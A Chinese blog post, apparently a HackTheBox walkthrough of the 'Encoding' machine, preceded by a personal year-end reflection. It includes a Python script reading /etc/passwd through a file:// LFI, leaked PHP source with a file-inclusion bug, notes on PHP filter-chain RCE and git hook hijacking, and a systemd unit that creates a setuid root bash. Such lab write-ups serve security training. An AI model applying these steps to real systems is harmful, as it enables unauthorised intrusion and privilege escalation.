# Encoding

## 前言

经过10个月左右的网安自学，我想说的第一句话无疑是：**感谢TryHackMe**。当然，后续的HackTheBox&学院、CRTO等等，对我的帮助都很大。

许多师傅们都在年度总结，我也看了大家都收获很多，都很厉害。我想我就没有必要了，**我想在2023这一年里我的博客内容就是最棒的总结和结果.**

昨天是我没有打htb靶机并且写wp的一天, 昨晚也是2023年最后一个夜晚，我们TryHackMyOffsecBox的八位师傅们一起在htb打4v4攻防对抗

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/fe261592-e905-6125-5b85-1f36943a1392.png)

当然啦，最终我也是惜败了，重要是我们八位师傅都使用kook语音交流，氛围很棒，双方的攻防过程也很爽，各位师傅反馈虽然靶机总是出问题，但是整体还是很爽的

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/c077ce83-3453-cc16-f072-991e30f5d93d.png)

我方视角：

**【2023年最后一晚 - HTB 网络安全4v4攻防对抗  M1n9K1n9第一视角-哔哩哔哩】 https://b23.tv/qdcYL2m**

对方视角：

**【TryHackMyOffsecBox 跨年活动 4v4 对抗 Cyber Mayhem Randark第一视角-哔哩哔哩】 https://b23.tv/NQup0VD**

---

目前htb 4v4攻防对抗这个游戏已经被我设置为群周常活动，每周日晚开打

就像一年前的今天，我在thm初学并且第一次打koth一样，这是历史以一种类似的方式重新上演了。

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/2474ef20-59dc-f1bb-3032-c7c7d1e87198.png)

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/65508bf3-bb52-6ab5-c259-b86a4c0e0112.png)

### 总而言之，保持学习，向大佬学习，继续向前，宁愿做大佬堆里的腊鸡，也不愿意做.......

---

Encoding是一种中等难度的 Linux 计算机，其 Web 应用程序容易受到本地文件读取的攻击。通过读取目标上的任意文件的能力，攻击者可以首先利用 Web 应用程序中的 PHP LFI 漏洞，以“www-data”用户身份访问服务器。然后，他们可以在服务器上发现一个名为“git-commit.sh”的脚本，该脚本允许他们以 James 用户的身份提交代码。通过检查“utils.php”文件，攻击者可以发现该脚本以具有 sudo 权限的“svc”用户身份运行。通过恶意 Git 钩子，攻击者可以获取“svc”用户的 SSH 密钥。该用户可以通过 sudo 以 root 用户身份重启服务。攻击者可滥用此权限，通过修改现有服务文件或创建新服务文件，以 root 身份执行任意代码。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/42dd3c3d-419b-f713-b1dd-b8496832eb3e.png)

### Web枚举

#### 任意文件读取

在api中看到一个

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/95f397f3-9e24-d6ec-6c23-1202772a91f9.png)

尝试一下就可以发现，这里存在LFI，把http改file协议

```python3
import requests

json_data = {
    'action': 'str2hex',
    'file_url' : 'file:///etc/passwd'

}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
```

decode就可以得到明文数据

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5676cafb-ea49-5d62-daa1-afca442dad0c.png)

读apache默认配置

```xml
<VirtualHost *:80>
	ServerName haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html


	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>


<VirtualHost *:80>
	ServerName api.haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/api
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
	DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
	#SecRuleEngine On

	<LocationMatch />
  		SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
  		SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
  		SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
  		SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
  		Header always set Retry-After "10" env=RATELIMITED
	</LocationMatch>

	ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

读/var/www/image/index.php

```php
<?php 
include_once 'utils.php';
include 'includes/coming_soon.html';
?>
```

utils.php

```php
<?php

// Global functions
function jsonify($body, $code = null)
{
    if ($code) {
        http_response_code($code);
    }
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($body);
    exit;
}

function get_url_content($url)
{
    $domain = parse_url($url, PHP_URL_HOST);
    if (gethostbyname($domain) === "127.0.0.1") {
        echo jsonify(["message" => "Unacceptable URL"]);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTP);
    curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,2);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    $url_content =  curl_exec($ch);
    curl_close($ch);
    return $url_content;
}

function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```

## Foothold

从上面两个函数里面的内容来看，/var/www/image下有git存储库

参考[这篇文章](https://medium.com/swlh/hacking-git-directories-e0e60fa79a36)，我们将手动从.git重建存储库

读HEAD看当前分支的引用

	file:///var/www/image/.git/HEAD

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5aeee3fc-45ab-22ca-20ed-031352efc9b9.png)

继续读 .git/refs/heads/master

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/dc5dd249-03dc-03ca-fff7-b49c1fbd31b4.png)

本地创建个目录并且创建git存储库

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/78ed7fd6-487d-5ec8-27a4-259f597592f3.png)

将文件下到本地

	.git/objects/9c/17e5362e5ce2f30023992daad5b74cc562750b

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6d8f1c60-7082-92a1-2aa6-2c96f4444cda.png)

git cat-file

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/384ec4b6-1d3c-e6ee-f14f-eb451851fa08.png)

接着读tree

	.git/objects/30/617cae3686895c80152d93a0568e3d0b6a0c49

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e59fc19c-04e9-e253-6feb-067972242753.png)

读actions

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/6857bec4-6df5-f46d-9d67-1a2dd638eb8f.png)

读action_handler.php，经典文件包含

```php
┌──(ming👻m1n9k1n9-parrot)-[~/test]
└─$ git cat-file -p 2d600ee8a453abd9bd515c41c8fa786b95f96f82
<?php

include_once 'utils.php';

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} else {
    echo jsonify(['message' => 'No page specified!']);
}

?>
```

然而image子域我们是无权访问的，但我们可以通过最开始的文件读取漏洞来转换为SSRF

utils.php中做了限制，我们通过@来绕过

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/50c543a4-d08e-0638-11d2-74a88cdb2715.png)

现在我们可以读到目标上的文件，同时我发现php://filter 也可用，但是就是无法访问目标机器外的远程文件，无法触发RFI

[这篇文章](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)给我们非常详细的讲述了如何绕过这种限制，并且利用iconv包装器通过奇奇怪怪的编码转换，在读取的文件头部中最终插入我们期望的字符串，最终导致RCE

脚本则在[github](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)

我们执行id命令

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/45006b3c-6c40-dc82-bccc-38cfe287bfaf.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9b97528a-c0a5-020b-afa0-f77be436a122.png)

常规bash reverse shell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5eab6db6-7250-f767-2f95-e96c2011c657.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/0cbfb664-cab1-73bd-27f7-de75bfe9326a.png)

## 本地横向移动 -> svc

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/86c08905-e9ad-96de-c416-63e27758dd7d.png)

发现.git有acl

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/1d391ab1-86c2-f775-49af-7a6c6ad2653f.png)

进.git/一看，全有acl

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/600a336a-0e20-1433-e395-3ce6314fb8f1.png)

既然hooks全都可写，那就是经典hook劫持

我们劫持git commit后会触发的post-commit

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c23843d6-7fdf-eff0-a530-b16c87b29869.png)

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/ead91ad3-b431-0b1b-50b0-4470eacb65fc.png)

此外，我们还需要通过--work-tree参数设置到其他目录，然后提交其他文件，因为我们在image/下无权新增其他文件

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/2bb2774a-12fa-f030-8288-32de7cd45e8f.png)

nc

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/99aa60e8-73d3-1c2a-a997-73201d698c83.png)

## 本地权限提升

sudo -l

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/cb556a6c-0277-29d6-0061-5a3bcc852900.png)

不出意外的话就要出意外了

从sudo -l这个条目不难看出进攻思路，当前用户svc肯定是对某个服务的配置文件可写，然后我们restart执行命令提权

在/etc/systemd下又发现system有acl，但是不可读

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/1b92591c-68d9-cc06-7d2e-6fe18e3b557b.png)

然而other可读，我们需要www-data的shell帮助我们

system/里面也是全是acl，随便看一个文件的acl，发现svc可写

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/076cc377-7344-1a62-e53c-8d8b90d2507c.png)

接下来就相当轻松也很熟悉了，随便搞个配置，抓住ExecStart

```bash
[Unit]
Description=My Service

[Service]
User=root
Group=root
ExecStart=/bin/bash -c "cp /bin/bash /tmp/bash;chmod +s /tmp/bash"

[Install]
WantedBy=default.target
```

保存到文件并且base64

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/e17812f0-f2c5-0645-a1b9-c8259f73fdba.png)

将base64在目标上解码并写入system/，再sudo去restart，我们的老朋友将如期而至

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/88b4a393-e546-982a-92eb-bf29e6ad66c6.png)

root flag还在老地方

